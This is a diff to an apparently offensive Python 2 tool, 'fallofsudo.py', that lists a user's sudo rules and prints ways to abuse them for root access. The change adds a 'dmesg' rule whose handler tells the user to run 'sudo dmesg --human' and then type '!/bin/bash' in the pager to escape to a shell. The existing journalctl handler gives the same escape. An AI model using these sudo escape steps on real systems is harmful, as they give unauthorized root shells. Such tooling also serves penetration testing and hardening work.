@@ -9,7 +9,7 @@
 # Usage Example: python fallofsudo.py
 # Description: This script obtains users Sudo rules and provides ways to abuse them. 
 #
-# STATUS: 42 SUDO RULES
+# STATUS: 43 SUDO RULES
 ###############################################################################################################
 
 import getpass
@@ -228,6 +228,9 @@ def sudopwner():
         elif 'journalctl' in item[3]:
             journalctl_user = item[0]
             choices.append('journalctl')
+        elif 'dmesg' in item[3]:
+            dmesg_user = item[0]
+            choices.append('dmesg')
 
 
     # Options for the user to choose which sudo rule they wish to abuse
@@ -325,6 +328,8 @@ def sudopwner():
         nano(nano_user)
     elif question == "journalctl":
         journalctl(journalctl_user)
+    elif question == "dmesg":
+        dmesg(dmesg_user)
     else:
         print OKRED + "[!] No rule matching that input... exiting you n00b!" + ENDC
         sys.exit()
@@ -1738,6 +1743,20 @@ def journalctl(journalctl_user):
         print OKRED + " [*] sudo journalctl" + ENDC
     else:
         print OKRED + " [*] sudo -u " + journalctl_user + " journalctl" + ENDC
+    print OKBLUE + "[2] Once the log is displayed type '!/bin/bash': " + ENDC
+    print OKRED + " [*] !/bin/bash" + ENDC
+    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
+    sys.exit()
+
+def dmesg(dmesg_user):
+
+    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
+    print OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN: " + ENDC
+    print OKBLUE + "[1] The first step is to view logs by running the 'dmesg --human' command: " + ENDC
+    if (dmesg_user == "ALL") or (dmesg_user == "root"):
+        print OKRED + " [*] sudo dmesg --human" + ENDC
+    else:
+        print OKRED + " [*] sudo -u " + dmesg_user + " dmesg --human" + ENDC
     print OKBLUE + "[2] Once the log is displayed type '!/bin/bash': " + ENDC
     print OKRED + " [*] !/bin/bash" + ENDC
     print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
